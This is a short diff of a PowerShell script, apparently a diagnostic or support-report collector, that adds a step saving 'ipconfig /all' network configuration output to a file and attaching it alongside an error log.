@@ -45,6 +45,19 @@ catch{
 }
 
 
+# ipconfig
+
+try {
+    $ipconfig = (ipconfig /all) 2>> $filepath\errors.txt
+    $ipconfig | Out-File -FilePath $filepath\ipconfig.txt -Append
+    $attachments += "$filepath\ipconfig.txt"
+}
+catch{
+    $ErrorOutput = $_.Exception.Message
+    "ipconfig error`n-----`n`n" + $ErrorOutput | Out-File -FilePath $filepath\errors.txt -Append
+}
+
+
 # Add error log to attachments array
 
 $attachments += "$filepath\errors.txt"
